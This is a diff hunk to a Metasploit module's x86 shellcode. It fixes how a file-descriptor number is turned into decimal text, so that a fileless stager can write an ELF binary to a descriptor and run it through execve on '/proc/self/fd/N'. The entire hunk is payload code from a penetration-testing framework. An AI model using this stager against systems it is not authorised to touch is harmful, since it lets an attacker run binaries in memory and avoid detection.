@@ -55,9 +55,28 @@ module MetasploitModule
         int 0x80                            ; write(fd, elfbuffer, elfbuffer_len);
         jmp get_command
       got_command:
-        add esi, 48
         pop ebx
-        mov [ebx + 14], esi
+        mov ecx, 18
+        mov eax, esi
+      itoa:
+        test eax, eax
+        jz fixpath
+        mov edx, 10
+        div dl
+        mov edx, eax
+        shr edx, 8
+        and eax, 255
+        add edx, 48
+        mov byte [ebx + ecx], dl
+        dec ecx
+        jmp itoa
+      fixpath:
+        cmp ecx, 13
+        je execve
+        mov byte [ebx + ecx], '/'
+        dec ecx
+        jmp fixpath
+      execve:
         xor ecx, ecx
         xor edx, edx
         mov eax, 0xb
@@ -65,7 +84,7 @@ module MetasploitModule
 
       get_command:
         call got_command
-        db "/proc/self/fd/", 0x00, 0x00
+        db "/proc/self/fd/", 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
       get_payload:
         call got_payload
     ^
